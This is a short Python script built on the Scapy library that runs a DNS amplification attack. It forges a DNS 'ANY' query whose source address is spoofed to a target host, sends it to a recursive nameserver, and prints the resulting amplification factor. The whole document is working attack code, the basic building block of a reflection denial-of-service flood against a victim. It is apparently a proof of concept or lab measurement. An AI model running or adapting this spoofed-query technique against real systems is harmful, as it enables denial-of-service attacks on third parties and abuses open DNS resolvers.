from scapy.all import *
 
target     = "10.21.4.3" # Target host
nameserver = "10.21.4.1" # DNS server - here we'll target the recursor specifically 
domain     = "fakesite.com" # Some domain name like "google.com" etc.

print("Starting the amplification attack!")
ip  = IP(src=target, dst=nameserver)
udp = UDP(dport=53)
dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=255))

request = (ip/udp/dns)
 
query = sr1(request,verbose=False, timeout=8)

result_dict = {
  'dns_destination':nameserver,
  'query_type':"All",
  'query_size':len(request),
  'response_size':len(query),
  'amplification_factor': ( len(query) / len(request) )
}

print(result_dict) 